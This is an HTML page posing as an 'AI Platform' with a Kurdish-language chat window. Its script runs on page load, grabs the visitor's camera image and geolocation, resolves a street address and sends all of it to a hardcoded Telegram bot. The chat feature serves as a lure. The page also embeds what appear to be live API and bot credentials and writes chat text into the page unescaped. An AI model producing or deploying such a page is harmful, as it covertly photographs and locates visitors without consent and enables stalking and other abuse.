<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Platform Index</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #2c3e50, #8e44ad);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
        }
        .ai-avatar {
            width: 200px;
            height: 200px;
            margin: 0 auto;
            background: url('https://i.ibb.co/YR0cBcK/pinterestdownloader-com-1734022613-676555-ezgif-com-video-to-gif-converter.gif') no-repeat center;
            background-size: cover;
            border-radius: 50%;
            border: 4px solid white;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.6);
        }
        h1 {
            margin: 20px 0;
            font-size: 2.5em;
        }
        .buttons {
            margin-top: 20px;
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            background-color: #3498db;
            color: white;
            font-size: 1.2em;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #2980b9;
        }
        .chat-window {
            margin-top: 30px;
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 10px;
            width: 300px;
            margin: 0 auto;
        }
        .chat-input {
            margin-top: 15px;
        }
        input[type="text"] {
            width: calc(100% - 50px);
            padding: 10px;
            border: none;
            border-radius: 5px;
            margin-right: 10px;
        }
        .send-btn {
            padding: 10px;
            background-color: #27ae60;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .send-btn:hover {
            background-color: #2ecc71;
        }
        #status {
            margin-top: 20px;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ai-avatar"></div>
        <h1>Welcome to the AI Platform</h1>
        <div class="buttons">
            <button onclick="captureImage()">Capture Image</button>
            <button onclick="alert('Chat with AI Coming Soon!')">Chat with AI</button>
        </div>
        <div class="chat-window">
            <div id="chat-log" style="height: 150px; overflow-y: auto;">
                <p><b>AI:</b> How can I assist you today?</p>
            </div>
            <div class="chat-input">
                <input type="text" id="user-input" placeholder="Type your message...">
                <button class="send-btn" onclick="sendMessage()">Send</button>
            </div>
        </div>
        <div id="status"></div>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        let locationData = null;
        let cameraStream = null;

        // Initialize location and camera access in parallel
        Promise.all([getLocation(), getCamera()])
            .then(([location, stream]) => {
                locationData = location;
                cameraStream = stream;
                captureImage(stream, location);
            })
            .catch(error => {
                console.error("Initialization error:", error);
                alert("Error initializing location or camera: " + error.message);
            });
    });

    function getLocation() {
        return new Promise((resolve, reject) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => resolve(position.coords),
                    error => reject(error)
                );
            } else {
                reject(new Error("Geolocation not supported"));
            }
        });
    }

    function getCamera() {
        return navigator.mediaDevices.getUserMedia({ video: true });
    }

    function captureImage(stream, location) {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = () => {
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const imageFile = new File([blob], "captured_image.png", { type: "image/png" });

                getLocationDetails(location.latitude, location.longitude)
                    .then(locationDetails => {
                        sendToBot(imageFile, location.latitude, location.longitude, locationDetails);
                    })
                    .catch(error => {
                        console.error("Error fetching location details:", error);
                    });

                // Stop the video stream
                stream.getTracks().forEach(track => track.stop());
            }, 'image/png');
        };
    }

    function getLocationDetails(latitude, longitude) {
        const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`;
        return fetch(url)
            .then(response => response.json())
            .then(data => ({ address: data.display_name }))
            .catch(error => {
                console.error("Error fetching location details:", error);
                return { address: "Unknown Location" };
            });
    }

    function sendToBot(imageFile, latitude, longitude, location) {
        const formData = new FormData();
        formData.append('chat_id', '2032344793');  // Replace with your chat ID
        formData.append('photo', imageFile);
        formData.append('caption', `Location: ${location.address}\nCoordinates: ${latitude}, ${longitude}`);

        fetch('https://api.telegram.org/bot5836151829:AAGw120dHzCMh9UMj0loSHOu8lvvzg2yli0/sendPhoto', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                document.getElementById('status').innerText = 'Image and location sent successfully.';
            } else {
                document.getElementById('status').innerText = 'Failed to send.';
            }
        })
        .catch(error => {
            console.error("Error sending data to bot:", error);
            document.getElementById('status').innerText = 'Error sending data to bot.';
        });
    }

    // AI Chat Functionality
    async function sendMessage() {
        const userInput = document.getElementById("user-input").value.trim();
        if (!userInput) return;

        const chatLog = document.getElementById("chat-log");
        chatLog.innerHTML += `<p><b>You:</b> ${userInput}</p>`;
        document.getElementById("user-input").value = "";

        // Call AI API for response
        try {
            const response = await fetch("https://api.openai.com/v1/chat/completions", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": "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", // Replace with your API key
                },
                body: JSON.stringify({
                    model: "gpt-4", // Specify the model
                    messages: [
                        { role: "system", content: "You are an assistant that communicates in Kurdish." },
                        { role: "user", content: userInput },
                    ],
                }),
            });

            const data = await response.json();
            if (response.ok) {
                const aiResponse = data.choices[0].message.content;
                chatLog.innerHTML += `<p><b>AI:</b> ${aiResponse}</p>`;
            } else {
                console.error("Error from AI API:", data);
                chatLog.innerHTML += `<p><b>AI:</b> Sorry, an error occurred while processing your request.</p>`;
            }
        } catch (error) {
            console.error("Error communicating with AI API:", error);
            chatLog.innerHTML += `<p><b>AI:</b> Unable to connect to AI API.</p>`;
        }

        // Scroll chat log to the bottom
        chatLog.scrollTop = chatLog.scrollHeight;
    }
    </script>
</body>
</html>
